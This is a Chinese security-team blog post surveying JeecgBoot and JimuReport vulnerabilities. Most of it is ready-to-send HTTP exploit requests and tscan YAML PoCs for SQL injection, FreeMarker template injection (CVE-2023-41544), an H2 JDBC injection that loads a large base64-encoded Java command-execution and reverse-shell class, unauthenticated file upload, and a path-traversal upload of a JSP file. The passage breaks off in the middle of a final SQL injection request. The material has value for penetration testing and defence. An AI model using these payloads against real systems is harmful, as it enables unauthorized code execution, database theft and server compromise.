---
source: "MrWQ/vulnerability-paper"
---

# Jeecg 漏洞总结及 tscan poc 分享

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/N6YttaBzGim0fWBYcfC1Aw)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png#imgIndex=0)

声明：Tide 安全团队原创文章，转载请声明出处！文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png#imgIndex=1)

前言
==

jeecgboot 是一款基于代码生成器的低代码开发平台，集成完善的工作流、表单、报表、大屏的平台！前后端分离架构 SpringBoot 2.x，SpringCloud，Ant Design&Vue，Mybatis-plus，Shiro，JWT，成熟的微服务解决方案。 最近的攻防演练中经常遇到部署该服务的系统，而且大部分都有可利用的漏洞点，故整理一篇漏洞总结文章方便日后查阅，并且根据 tscan 脚本规则编写了其中一部分的 poc。

**这篇文章只整理了一些利用价值较高的漏洞，部分漏洞如信息泄露、任意文件下载、任意用户密码重置等未一一复现。**

Jeecg-boot 3.4.4 /sys/dict/queryTableData SQL 注入
------------------------------------------------

### 漏洞简介

**cve 公告：**在 Jeecg-boot 3.4.4 中曾发现分类为致命的漏洞。 此漏洞会影响未知代码文件 / sys/dict/queryTableData。 手动调试的不合法输入可导致 SQL 注入。

### 漏洞复现

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13
Content-Type: application/json; charset=utf-8
Content-Length: 127
Host: 
Connection: close
Accept-Encoding: gzip, deflate

{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}


```

该漏洞的另一个常见路径为

```
/jmreport/qurestSql


```

其他参数不变

### Tscan 脚本

详见

```
http://wiki.tidesec.com/docs/Weapon/Weapon-1f9r5r44rudto


```

jeecg-boot / 积木报表系统 testConnection 接口远程命令执行
-------------------------------------------

### 漏洞简介

jeecg-boot/jmreport/testConnection Api 接口未进行身份验证，并且未对 dbUrl 参数进行限制，导致攻击者可以向指定地址发起 JDBC 请求。

### 漏洞复现

```
POST /jmreport/testConnection HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/json
Cmd: whoami
Content-Length: 8902

{
          "id":"1",
          "code":"ABC",
          "dbType":"MySQL",
          "dbDriver":"org.h2.Driver",
          "dbUrl":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;}'\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')",
          "dbName":"383BAb7deFC825E6",
          "dbPassword":"917982",
          "userName":"917982"
        }

### Tscan脚本
详见


```

http://wiki.tidesec.com/docs/Weapon/Weapon-1f92eq1vnag6l

JeecgBoot jmreport/loadTableData SSTI 模板注入漏洞 (CVE-2023-41544)
-------------------------------------------------------------

### 漏洞简介

**cve 公告：**jeecg-boot 版本 3.5.3 中的 SSTI 注入漏洞允许远程攻击者通过对 /jmreport/loadTableData 组件进行精心设计的 HTTP 请求执行任意代码。

### 漏洞复现

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
X-Sign: AD0488642A880C68C8E3551C3BE0F6F5
X-TIMESTAMP: 1699726206096
X-Access-Token: null
token: null
JmReport-Tenant-Id: null
Content-Length: 167
Connection: close
Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726162

{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}


```

  

### poc

```
params: []
name: JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 (CVE-2023-41544)
set:
  a1: randomLowercase(10)
rules:
- method: POST
  path: /jeecg-boot/jmreport/loadTableData
  headers:
    Content-Type: application/json;charset=UTF-8
    X-Sign: AD0488642A880C68C8E3551C3BE0F6F5
  body: '{"dbSource":"","sql":"select ''<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"echo
    {{r1}}\")}''","tableName":"test_demo);","pageNo":1,"pageSize":10}'
  search: ""
  followredirects: false
  expression: response.status==200 && response.body.bcontains(bytes(a1))
groups: {}
detail:
  author: ""
  links: []
  description: ""
  version: ""


```

JeecgBoot AviatorScript 表达式注入
-----------------------------

### 漏洞简介

积木报表软件存在 AviatorScript 代码注入 RCE 漏洞。使用接口 / jmreport/save 处在 text 中写入 AviatorScript 表达式。访问 / jmreport/show 触发 AviatorScript 解析从而导致命令执行。

### 影响版本

v1.7.8

### 漏洞复现

验证 poc

```
POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 34


{
 "sql":"select 'ycxhhh'"
}


```

利用 poc

```
POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 108

{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami \") }'" 
 }


```

  

### poc

```
params: []
name: JeecgBoot AviatorScript表达式注入
set: {}
rules:
- method: POST
  path: /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123
  headers:
    Accept: application/json, text/plain, */*
    Content-Type: application/json
  body: "{\"sql\":\"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()>
    ${ex(\\\"whoami \\\") }'\" \n }"
  search: ""
  followredirects: false
  expression: 'response.status == 200 && response.body.bcontains(b"success") && response.body.bcontains(b"true")
    && response.body.bcontains(b"result") '
groups: {}
detail:
  author: ""
  links: []
  description: ""
  version: ""


```

jeecg-boot/jmreport/upload 接口存在未授权任意文件上传
----------------------------------------

### 漏洞简介

测试发现 / jeecg-boot/jmreport/upload 接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带 token。

### 漏洞复现

```
POST /jeecg-boot/jmreport/upload HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
Cache-Control: no-cache
Pragma: no-cache
Host: 
Content-Length: 1476

------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; 
Content-Type: text/html

<%! 1111>
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; 

11111.txt
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; 

excel_online
------WebKitFormBoundaryyfyhSCMs9cajzFD4--


```

以下为访问路径下图的返回信息表示无 token 不可访问

### poc

```
params: []
name: jeecg-boot/jmreport/upload接口存在未授权任意文件上传
set:
  filename: randomLowercase(6)
rules:
- method: POST
  path: /jeecg-boot/jmreport/upload
  headers:
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
    tenantId: "null"
  body: |-
    ------WebKitFormBoundaryyfyhSCMs9cajzFD4
    Content-Disposition: form-data; {{filename}}.txt"
    Content-Type: text/html

    <%! 1111>
    ------WebKitFormBoundaryyfyhSCMs9cajzFD4
    Content-Disposition: form-data; 

    {{filename}}.txt
    ------WebKitFormBoundaryyfyhSCMs9cajzFD4
    Content-Disposition: form-data; 

    excel_online
    ------WebKitFormBoundaryyfyhSCMs9cajzFD4--
  search: ""
  followredirects: false
  expression: response.status == 200 && response.body.bcontains(b"true") && response.body.bcontains(bytes(string(filename)))
groups: {}
detail:
  author: ""
  links: []
  description: ""
  version: ""


```

JeecgBoot onlDragDatasetHead/getTotalData SQL 注入 (CVE-2024-48307)
-----------------------------------------------------------------

### 漏洞简介

发现 JeecgBoot v3.7.1 通过组件 /onlDragDatasetHead/getTotalData 存在 SQL 注入漏洞。

### 漏洞复现

```
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/2
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: application/json
Content-Length: 281

{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(0x7e,version(),0x7e)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}


```

  

### poc

```
params: []
name: JeecgBoot onlDragDatasetHead/getTotalData SQL注入(CVE-2024-48307)
set:
  rint: randomInt(800000000, 1000000000)
  result: base64("~"+md5(string(rint))+"~")
rules:
- method: POST
  path: /jeecg-boot/drag/onlDragDatasetHead/getTotalData
  headers:
    Content-Type: application/json
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/109.0.5414.75 Safari/537.36
  body: '{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(0x7e,md5({{rint}}),0x7e)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}'
  search: ""
  followredirects: false
  expression: response.status==200 && response.body.bcontains(bytes(result))
groups: {}
detail:
  author: ""
  links: []
  description: ""
  version: ""



```

Jeecg-commonController.do 文件上传
------------------------------

### 漏洞简介

由于 /api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ../ 的 url 绕过鉴权。攻击者可构造恶意请求利用 commonController 接口进行文件上传攻击实现远程代码执行。

### 漏洞复现

```
POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Length: 360
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Connection: close

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; "

zW9YCa.png
------WebKitFormBoundarygcflwtei
ontent-Disposition: form-data; 

blank
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; 
Content-Type: image/png

11111
------WebKitFormBoundarygcflwtei--


```

  

### poc

```
params: []
name: Jeecg-commonController.do文件上传
set:
  filename: randomLowercase(5)
  r1: randomLowercase(10)
rules:
- method: POST
  path: /api/../commonController.do?parserXml
  headers:
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
  body: |-
    ------WebKitFormBoundarygcflwtei
    Content-Disposition: form-data; "

    zW9YCa.png
    ------WebKitFormBoundarygcflwtei
    ontent-Disposition: form-data; 

    blank
    ------WebKitFormBoundarygcflwtei
    Content-Disposition: form-data; {{filename}}.jsp"
    Content-Type: image/png

    {{r1}}
    ------WebKitFormBoundarygcflwtei--
  search: ""
  followredirects: false
  expression: response.status == 200
- method: GET
  path: /{{filename}}.jsp
  headers: {}
  body: ""
  search: ""
  followredirects: false
  expression: response.status == 200 && response.body.bcontains(bytes(string(r1)))
groups: {}
detail:
  author: ""
  links: []
  description: ""
  version: ""


```

jeecg-boot-getDictItemsByTable sql 注入漏洞
---------------------------------------

### 漏洞简介

JeecgBoot 是一款基于代码生成器的低代码开发平台，它专为简化 Java 项目开发流程、提高开发效率而设计。攻击者通过注入恶意的 SQL 代码，能够窃取、篡改或删除数据库中的数据，甚至执行系统命令，对网站和服务器造成严重影响

### 漏洞复现

```
GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Purpose: prefetch
Connection: close
Priority: u=6


```

  

Jeecg-Boot /jmreport/show SQL 注入漏洞 (CVE-2023-34659)
---------------------------------------------------

### 漏洞简介

jeecg-boot 3.5.0 和 3.5.1 版本存在安全漏洞，该漏洞源于 /jeecg-boot/jmreport/show 接口的 id 参数存在 SQL 注入漏洞。

### 漏洞复现

漏洞点位于 “统计报表”--“积木报表例子”

```
POST /jeecg-boot/jmreport/show HTTP/1.1
Host: 
